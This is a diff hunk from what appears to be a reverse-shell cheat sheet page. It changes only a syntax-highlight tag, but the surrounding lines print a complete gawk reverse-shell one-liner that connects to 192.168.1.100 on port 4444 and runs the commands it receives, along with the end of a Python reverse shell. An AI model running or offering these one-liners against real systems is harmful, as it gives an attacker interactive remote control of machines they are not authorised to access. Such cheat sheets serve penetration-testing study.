@@ -185,7 +185,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 Gawk one liner rev shell by @dmfroberson: 
 
-{% highlight bash %}
+{% highlight gawk %}
 gawk 'BEGIN {P=4444;S="> ";H="192.168.1.100";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
 {% endhighlight %}
 
